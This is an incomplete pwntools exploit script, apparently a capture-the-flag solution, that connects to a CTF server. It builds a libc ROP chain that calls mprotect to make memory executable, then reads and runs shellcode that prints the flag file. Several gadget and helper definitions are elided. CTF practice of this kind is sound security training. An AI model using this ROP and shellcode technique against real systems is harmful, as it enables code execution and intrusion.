...
#io = process("./pwn")
io = remote("node4.anna.nssctf.cn", 28094)
elf = ELF("./pwn")
libc = elf.libc
...
jmp_rsi = libc.address + 0x000000000010d5dd # jmp rsi
r = libc.sym.read
g = libc.sym.gets
mprotect = libc.sym.mprotect

#debug()
pay = p64(rdi) + p64(ret+0x18) + p64(g)
add(0x80, pay)

shellcode  = p64(rdi) + p64(ret&(~0xfff)) + p64(rsi) + p64(0x2000) + p64(rdx) + p64(7) + p64(mprotect)
shellcode += p64(rdi) + p64(0) + p64(rsi) + p64(ret+0x200) + p64(rdx) + p64(0x200) + p64(r) + p64(jmp_rsi)
sl(shellcode)
cat = asm(shellcraft.cat('./flag'))
sl(cat)
